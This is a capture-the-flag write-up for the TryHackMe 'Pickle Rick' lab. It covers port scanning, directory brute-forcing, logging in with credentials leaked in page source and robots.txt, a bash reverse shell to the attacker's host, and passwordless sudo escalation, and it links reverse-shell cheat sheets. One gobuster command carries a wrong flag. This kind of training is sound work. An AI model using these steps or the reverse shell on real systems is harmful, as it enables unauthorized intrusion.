# CTF-Write-up

## Try Hack Me: Pickle Rick

##### URL: https://tryhackme.com/room/picklerick

Created by _tryhackme_

![logo13](https://user-images.githubusercontent.com/20625004/106916580-053db580-6710-11eb-8f5e-da88c6f75659.PNG)

You should deploy the machine first.

Run nmap against the target machine.

```nmap <target IP>```

![logo3](https://user-images.githubusercontent.com/20625004/106917548-08857100-6711-11eb-8781-fcc2fc1ded56.PNG)

SSH and HTTP services are only available.

We access the target IP on port 80.

![logo1](https://user-images.githubusercontent.com/20625004/106918014-80ec3200-6711-11eb-98be-aef684379d8f.PNG)

We have a web site with little information, apart from the fact that Rick wants our help, now lets check the source code of the page.

![logo2](https://user-images.githubusercontent.com/20625004/106918406-d6c0da00-6711-11eb-97e3-f345f157327d.PNG)

Nice and simple we have obtained a username ```@@@@@@```. So somewhere there has to be a login portal.

Now lets brute force the directories of the web page in order to find any hidden from us.
using ```dirb``` or ```gobuster``` should do the job.

```gobuster dir -u <target IP> -u /usr/share/wordlists/dirb/common.txt```

With the above command we can find directories in a web site, it relies on wordlists so you should check in the path ```/usr/share/wordlists``` and choose the wordlist you want to check.

![logo4](https://user-images.githubusercontent.com/20625004/106919453-d412b480-6712-11eb-8f34-067477036545.PNG)

OK we found something, now lets check the robots.txt path.

![logo5](https://user-images.githubusercontent.com/20625004/106920461-c6116380-6713-11eb-9a91-1a8a727016a6.PNG)

OK that is something which we can try later on. But we have not found yet a portal. From the wordlist we used before we were not able to find a portal, so we can choose another one or try manual checks, such as login.php.

Bingo 

![logo6](https://user-images.githubusercontent.com/20625004/106926862-34592480-671a-11eb-84cc-e055b4ebf939.PNG)

We found the portal, now lets try the username we found from the source code of the webpage ```http://<target IP>:80``` and for the password let's use the one we found on ```robots.txt``` path.

![logo7](https://user-images.githubusercontent.com/20625004/106927153-90bc4400-671a-11eb-91ca-f316ca578fdf.PNG)

We now have access to the command portal.
Let's use some command and see what happens, just type ```ls -l```.

![logo8](https://user-images.githubusercontent.com/20625004/106927901-4edfcd80-671b-11eb-8b35-c1249e8a0e3a.PNG)

The command outputs some files, an intersting is ```Sup3rS3cretPickl3Ingred.txt```, ok just access it in the web browser ```http://<target IP>:80/Sup3rS3cretPickl3Ingred.txt```

![logo9](https://user-images.githubusercontent.com/20625004/106928625-0d035700-671c-11eb-87df-4d092803ee92.PNG)

And we have our first ingredient.

Since we can execute commands we are going to try and use reverse shell. Good info can be found in the below links regarding reverse shell.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://github.com/security-cheatsheet/reverse-shell-cheatsheet

fire up ```nc```

```nc -lvnp 8080```
```listening on [any] 8080 ...```

Our listener is up and ready
Now go to the command panel of the webpage and add the reverse shell.
```bash -c 'bash -i >& /dev/tcp/<Your IP>/<Listening Port same as in nc> 0>&1'```.

It worked, and now we have access to the machine.

![logo11](https://user-images.githubusercontent.com/20625004/106932584-96b52380-6720-11eb-9490-abb4ef570ed5.PNG)

By looking around and accessing the folder ```/home/rick/``` we found the second ingredient.

Further by issuing the command ```sudo -l ``` we observe that the user can execute sudo commands without the need for a password.
Looking around on the ```/root/``` directory we can find the third ingredient.

![logo12](https://user-images.githubusercontent.com/20625004/106933324-72a61200-6721-11eb-9f07-305665184df6.PNG)

